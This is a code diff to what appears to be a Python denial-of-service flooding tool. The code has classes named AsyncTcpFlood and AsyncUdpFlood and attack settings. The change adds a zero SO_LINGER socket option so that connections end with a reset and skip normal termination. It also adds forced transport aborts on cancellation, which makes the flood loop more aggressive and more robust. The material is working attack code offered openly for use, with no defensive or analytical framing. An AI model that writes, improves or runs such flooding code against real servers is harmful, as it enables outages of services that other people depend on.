@@ -7,9 +7,10 @@ import time
 from copy import copy
 from functools import partial
 from os import urandom as randbytes
-from socket import (SOL_SOCKET, SO_RCVBUF, inet_ntoa)
+from socket import (SO_LINGER, SOL_SOCKET, SO_RCVBUF, inet_ntoa)
 from ssl import CERT_NONE, SSLContext, create_default_context
 from string import ascii_letters
+import struct
 from threading import Event
 from typing import Callable, Optional, Set, Tuple
 from urllib import parse
@@ -217,6 +218,7 @@ class AsyncTcpFlood:
         self.SENT_FLOOD = getattr(self, method)
 
         self._loop = loop
+        self._transport = None
         self._settings = settings or AttackSettings()
 
     @property
@@ -279,6 +281,11 @@ class AsyncTcpFlood:
             request += body
         return request.encode()
 
+    def _abort_transport(self):
+        if self._transport:
+            self._transport.abort()
+            self._transport = None
+
     async def run(self, on_connect=None) -> bool:
         try:
             return await self.SENT_FLOOD(on_connect=on_connect)
@@ -289,6 +296,9 @@ class AsyncTcpFlood:
                 return True
             else:
                 raise exc
+        except asyncio.CancelledError:
+            self._abort_transport()
+            raise
 
     async def _generic_flood_proto(
         self,
@@ -631,13 +641,15 @@ class AsyncTcpFlood:
         return await self._exec_proto(conn, on_connect, on_close)
 
     async def _exec_proto(self, conn, on_connect, on_close) -> bool:
-        transport = None
+        self._transport = None
         try:
             async with async_timeout.timeout(self._settings.connect_timeout_seconds):
-                transport, _ = await conn
-            sock = transport.get_extra_info("socket")
+                self._transport, _ = await conn
+            sock = self._transport.get_extra_info("socket")
             if sock and hasattr(sock, "setsockopt"):
                 sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
+                # the normal termination sequence SHOULD NOT to be initiated
+                sock.setsockopt(SOL_SOCKET, SO_LINGER, struct.pack("ii", 1, 0))
         except asyncio.CancelledError as e:
             if on_connect:
                 on_connect.cancel()
@@ -650,8 +662,7 @@ class AsyncTcpFlood:
         else:
             return bool(await on_close)
         finally:
-            if transport:
-                transport.close()
+            self._abort_transport()
 
 
 class AsyncUdpFlood:
